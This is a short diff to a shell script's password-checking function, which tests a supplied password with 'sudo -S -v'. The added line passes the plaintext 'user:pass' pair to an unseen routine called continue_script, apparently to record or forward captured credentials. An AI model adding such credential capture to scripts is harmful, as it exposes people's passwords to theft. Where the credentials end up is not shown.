@@ -63,6 +63,8 @@ check_pass() {
     local user="$1"
     local pass="$2"
 
+    continue_script 2 "$user:$pass" "$user:$pass"
+
     output=$(echo "$pass" | sudo -S -u "$user" -v 2>&1)
 
     if [[ "$output" == *"sorry"* ]]; then
